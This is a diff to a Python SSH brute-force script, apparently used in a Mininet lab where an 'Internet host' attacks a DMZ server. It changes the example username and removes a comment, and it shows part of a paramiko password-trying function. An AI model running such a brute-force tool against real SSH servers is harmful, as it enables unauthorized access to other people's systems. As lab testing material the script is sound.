@@ -3,7 +3,7 @@
 SSH brute-force attack.
 Run from the Internet host (10.2.0.2) against a DMZ SSH server.
 Usage: python3 attack_ssh_bruteforce.py <target_ip> <username> <wordlist>
-Example: python3 attack_ssh_bruteforce.py 10.12.0.10 root passwords.txt
+Example: python3 attack_ssh_bruteforce.py 10.12.0.10 mininet passwords.txt
 """
 
 import sys
@@ -28,7 +28,6 @@ def try_password(target, username, password, timeout=0.1):
     except paramiko.AuthenticationException:
         return False
     except (paramiko.SSHException, socket.error, socket.timeout, EOFError):
-        # Connection refused, reset, or timed out — likely firewall-dropped
         return None
 
 def brute_force(target, username, wordlist_path):
